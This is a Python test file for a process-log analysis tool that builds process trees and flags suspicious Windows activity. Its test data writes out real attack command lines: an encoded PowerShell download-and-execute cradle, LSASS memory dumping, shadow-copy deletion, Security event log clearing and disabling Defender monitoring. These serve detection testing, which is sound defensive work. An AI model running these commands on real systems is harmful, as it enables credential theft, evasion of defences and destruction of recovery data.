"""Process-log analysis: tree building and detection rules."""

import base64
import json
from pathlib import Path

from triage_agents.analysis.logs import analyze_process_events, build_process_tree

FIXTURE = Path(__file__).parent / "fixtures" / "minimal_alert.json"


def ev(pid, ppid, image, cmd="", ts="2026-11-01T10:00:00Z"):
    return {"timestamp": ts, "pid": pid, "ppid": ppid, "image": image, "command_line": cmd}


def rule_ids(result):
    return {f["rule_id"] for f in result["findings"]}


def test_tree_links_children_and_finds_roots():
    events = [ev(10, 1, r"C:\Windows\explorer.exe"), ev(20, 10, r"C:\Windows\System32\cmd.exe"),
              ev(30, 20, r"C:\Windows\System32\whoami.exe")]
    tree = build_process_tree(events)
    assert tree["roots"] == [10]  # pid 1 is not in the log, so 10 becomes a root
    assert tree["nodes"][10]["children"] == [20]
    assert tree["text"].splitlines()[2].strip().startswith("└─ whoami.exe")


def test_tree_survives_pid_loops():
    tree = build_process_tree([ev(5, 6, "a.exe"), ev(6, 5, "b.exe")])
    assert tree["text"] == ""  # no root, and the loop does not recurse forever
    assert len(tree["nodes"]) == 2


def test_fixture_word_macro_chain():
    alert = json.loads(FIXTURE.read_text(encoding="utf-8"))
    result = analyze_process_events(alert["process_events"])
    ids = rule_ids(result)
    assert {"office_spawns_shell", "ps_encoded_command", "ps_hidden_window"} <= ids
    decoded = next(f for f in result["findings"] if f["rule_id"] == "ps_encoded_payload_decoded")
    assert decoded["decoded"] == "IEX"  # the fixture's -enc argument decodes to "IEX"


def test_rules_also_run_on_the_decoded_payload():
    hidden = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/p.ps1')"
    b64 = base64.b64encode(hidden.encode("utf-16le")).decode()
    result = analyze_process_events([ev(2, 1, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                                        f"powershell.exe -enc {b64}")])
    cradle = [f for f in result["findings"] if f["rule_id"] == "download_cradle"]
    assert cradle and cradle[0]["matched_in"] == "decoded -EncodedCommand payload"


def test_rundll32_from_appdata_flagged_but_system_use_is_not():
    bad = analyze_process_events([ev(2, 1, r"C:\Windows\System32\rundll32.exe",
                                     r"rundll32.exe C:\Users\bob\AppData\Local\Temp\upd.dll,Start")])
    ok = analyze_process_events([ev(2, 1, r"C:\Windows\System32\rundll32.exe",
                                    r"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL desk.cpl")])
    assert "rundll32_user_path" in rule_ids(bad)
    assert rule_ids(ok) == set()


def test_lsass_dump_variants():
    for cmd in [r"procdump64.exe -accepteula -ma lsass.exe C:\temp\l.dmp",
                r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\x.bin full"]:
        assert "lsass_dump" in rule_ids(analyze_process_events([ev(2, 1, "x.exe", cmd)])), cmd


def test_masquerading_svchost():
    result = analyze_process_events([ev(2, 1, r"C:\Users\Public\svchost.exe", "svchost.exe -k netsvcs")])
    assert "masquerading_system_binary" in rule_ids(result)
    real = analyze_process_events([ev(2, 1, r"C:\Windows\System32\svchost.exe", "svchost.exe -k netsvcs")])
    assert "masquerading_system_binary" not in rule_ids(real)


def test_recon_burst_needs_three_distinct_commands_in_five_minutes():
    burst = [ev(2, 1, "cmd.exe", "whoami /all", "2026-11-01T10:00:00Z"),
             ev(3, 1, "cmd.exe", "net user /domain", "2026-11-01T10:01:00Z"),
             ev(4, 1, "cmd.exe", "nltest /domain_trusts", "2026-11-01T10:02:30Z")]
    spread = [ev(2, 1, "cmd.exe", "whoami", "2026-11-01T10:00:00Z"),
              ev(3, 1, "cmd.exe", "net user", "2026-11-01T11:00:00Z"),
              ev(4, 1, "cmd.exe", "systeminfo", "2026-11-01T12:00:00Z")]
    assert "recon_burst" in rule_ids(analyze_process_events(burst))
    assert "recon_burst" not in rule_ids(analyze_process_events(spread))


def test_ransomware_precursors():
    events = [ev(2, 1, "cmd.exe", "vssadmin.exe delete shadows /all /quiet"),
              ev(3, 1, "cmd.exe", "wevtutil cl Security"),
              ev(4, 1, "powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true")]
    assert {"shadow_copy_deletion", "event_log_clearing", "defender_tamper"} <= rule_ids(
        analyze_process_events(events))


def test_benign_admin_activity_is_quiet():
    events = [ev(2, 1, r"C:\Windows\explorer.exe"),
              ev(3, 2, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe Get-Service"),
              ev(4, 2, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "WINWORD.EXE report.docx")]
    result = analyze_process_events(events)
    assert result["findings"] == [] and result["score"] == 0
